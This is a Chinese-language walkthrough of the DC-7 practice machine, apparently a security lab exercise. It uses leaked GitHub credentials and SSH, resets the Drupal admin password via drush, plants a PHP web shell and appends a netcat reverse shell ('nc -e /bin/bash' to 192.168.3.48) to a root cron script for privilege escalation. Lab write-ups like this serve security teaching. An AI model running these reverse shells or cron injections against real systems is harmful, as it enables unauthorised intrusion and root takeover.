## 1.搜寻信息
一开始的`nmap`、`dirsearch`找出来的没有用，后看提示才发现是`git源码泄露`
![[Pasted image 20260114210849.png]]

https://github.com/Dc7User/staffdb/blob/master/config.php
先去`github`上找到这个密码
```php
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```
发现登录不上，那就转换思路，尝试`ssh`
![[Pasted image 20260114195605.png]]
## 2.登录ssh

**提权**
```bash
dc7user@dc-7:~$ sudo -l
-bash: sudo: command not found
dc7user@dc-7:~$ ls
backups  mbox
dc7user@dc-7:~$ cat mbox 

From root@dc-7 Thu Aug 29 17:00:22 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3EPu-0000CV-5C
        for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EPu-0000CV-5C@dc-7>
Date: Thu, 29 Aug 2019 17:00:22 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:15:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3EeF-0000Dx-G1
        for root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EeF-0000Dx-G1@dc-7>
Date: Thu, 29 Aug 2019 17:15:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:30:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Esl-0000Ec-JQ
        for root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Esl-0000Ec-JQ@dc-7>
Date: Thu, 29 Aug 2019 17:30:11 +1000
```
发现每15分钟执行一次定时任务 `/opt/scripts/backups.sh`

查看下定时任务的权限
```bash
dc7user@dc-7:~$ cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz

dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh
-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh
```

`-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh` 
可以看到当前的`dc7user` 用户属于other group , 无 `x` 写权限，无法写入`nc`脚本，因此需要网页写入

寻找有`root`权限的文件
```bash
dc7user@dc-7:~$ find / -user root -perm -4000 2>/dev/null
/bin/su
/bin/ping
/bin/umount
/bin/mount
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp

dc7user@dc-7:~$ /usr/sbin/exim4 --version
Exim version 4.89 #2 built 20-Jul-2019 11:32:35
Copyright (c) University of Cambridge, 1995 - 2017
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017
Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
Authenticators: cram_md5 plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Configure owner: 0:0
Size of off_t: 8
Configuration file is /var/lib/exim4/config.autogenerated
```

参考`DC8`的方案，尝试`exim4`提权==> *失败*
![[Pasted image 20260114201043.png]]

继续查找有用的信息，发现`.drush`
```bash
dc7user@dc-7:~$ ls -la
total 44
drwxr-xr-x 5 dc7user dc7user 4096 Jan 14 22:10 .
drwxr-xr-x 3 root    root    4096 Aug 29  2019 ..
-rw-r--r-- 1 dc7user dc7user 3552 Jan 12 22:34 a.sh
drwxr-xr-x 2 dc7user dc7user 4096 Jan 14 22:00 backups
lrwxrwxrwx 1 dc7user dc7user    9 Aug 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 dc7user dc7user  220 Aug 29  2019 .bash_logout
-rw-r--r-- 1 dc7user dc7user 3953 Aug 29  2019 .bashrc
drwxr-xr-x 3 dc7user dc7user 4096 Aug 29  2019 .drush
drwx------ 3 dc7user dc7user 4096 Jan 14 22:00 .gnupg
-rw------- 1 dc7user dc7user 7938 Aug 30  2019 mbox
-rw-r--r-- 1 dc7user dc7user  675 Aug 29  2019 .profile
```

**Drush**（Drupal Shell）是 Drupal 内容管理系统的**命令行工具与脚本接口**，被称为 Drupal 开发者的 "瑞士军刀"。它由 Moshe Weitzman 于 2006 年创建，旨在通过命令行界面简化 Drupal 站点的安装、开发、调试与维护工作，大幅提升效率并减少通过 Web 界面操作可能产生的错误。

Drush 可以直接访问 Drupal 核心功能和 API，无需通过网站前端，支持自动化脚本编写，实现重复性任务的批量处理。官方文档位于 [drush.org](https://www.drush.org/latest/)。

> [!Success] drush用户管理
> ```
> drush user-create admin --password="securepass" # 创建管理员用户 
> drush user-password admin --password="newpass" # 重置用户密码 
> drush user-login # 生成一次性登录链接
> ```

利用`drush`修改密码，这里一定要注意在`/var/www/html/`目录下执行才可以
```
dc7user@dc-7:~/.drush$ cd /var/www/html/
dc7user@dc-7:/var/www/html$ drush user-password admin --password="123456"
Changed password for admin 
```
这里管理员用户名为： `admin`  密码为：`123456`

## 3.登录管理员
![[Pasted image 20260114202552.png]]

这里发现没法选择`php`代码执行，需要自己安装
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz

选择`extend`进行安装`php`插件
![[Pasted image 20260114202826.png]]
安装完成之后记得勾选`php`，然后点击最下面的`install`
![[Pasted image 20260114203659.png]]
选择`content`,编辑内容
![[Pasted image 20260114204752.png]]
写入`nc`脚本
![[Pasted image 20260114204649.png]]
```php
<?php
system("nc -e /bin/bash 192.168.3.48 1111");
?>
```

进入`nc`反弹脚本，==nc的命令是谁执行反弹谁的权限==，因此再次写入一个`nc`脚本至定时任务`/opt/scripts/backups.sh`,目的是让`root`执行，获取`root`的权限

**进入`nc`后创建一个伪终端，提高命令窗口交互**
**`python -c 'import pty; pty.spawn("/bin/bash")`**

```bash
www-data@dc-7:/var/www/html$ echo "nc -e /bin/bash 192.168.3.48 2222" >> /opt/scripts/backups.sh
</bash 192.168.3.48 2222" >> /opt/scripts/backups.sh
www-data@dc-7:/var/www/html$ cat /opt/scripts/backups.sh
cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
nc -e /bin/bash 192.168.3.48 2222
```

接下来可以手动执行一下脚本测试，发现反弹的还是`user`权限，验证了==nc的命令是谁执行反弹谁的权限==
![[Pasted image 20260114205405.png]]

等待定时任务自动执行成功获得`root`权限
![[Pasted image 20260114210052.png]]

*Tips:* 可以用`mail`查看邮件
![[Pasted image 20260114211751.png]]